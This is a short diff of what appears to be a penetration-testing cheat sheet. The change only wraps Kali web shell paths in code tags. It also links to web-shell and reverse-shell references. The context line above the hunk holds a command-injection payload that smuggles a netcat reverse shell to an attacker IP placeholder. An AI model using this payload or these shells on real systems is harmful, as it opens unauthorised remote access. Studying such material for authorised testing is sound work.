@@ -105,12 +105,12 @@ test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
 > **Web Shells**
 
 Kali: 
-PHP | /usr/share/webshells/php/
-PERL | /usr/share/webshells/perl/
-Cold Fusion | /usr/share/webshells/cfm/
-ASP | /usr/share/webshells/asp/
-ASPX | /usr/share/webshells/aspx/
-JSP | /usr/share/webshells/jsp/jsp-reverse.jsp
+PHP | <code> /usr/share/webshells/php/ </code>
+PERL | <code> /usr/share/webshells/perl/ </code>
+Cold Fusion | <code> /usr/share/webshells/cfm/ </code>
+ASP | <code> /usr/share/webshells/asp/ </code>
+ASPX | <code> /usr/share/webshells/aspx/ </code>
+JSP | <code> /usr/share/webshells/jsp/jsp-reverse.jsp </code>
 
 * [PHP and Perl](http://pentestmonkey.net/category/tools/web-shells)
 * [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
